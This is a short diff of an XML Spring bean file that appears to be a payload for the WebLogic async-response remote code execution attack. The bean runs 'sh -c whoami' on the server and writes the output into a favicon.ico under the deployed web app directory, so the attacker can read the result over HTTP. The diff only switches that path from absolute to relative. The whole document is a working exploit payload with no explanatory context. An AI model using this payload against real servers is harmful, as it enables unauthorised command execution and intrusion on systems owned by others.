@@ -8,7 +8,7 @@
             <list>
                 <value>sh</value>
                 <value>-c</value>
-                <value><![CDATA[whoami > /servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/favicon.ico]]></value>
+                <value><![CDATA[whoami > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/favicon.ico]]></value>
             </list>
             </constructor-arg>
         </bean>
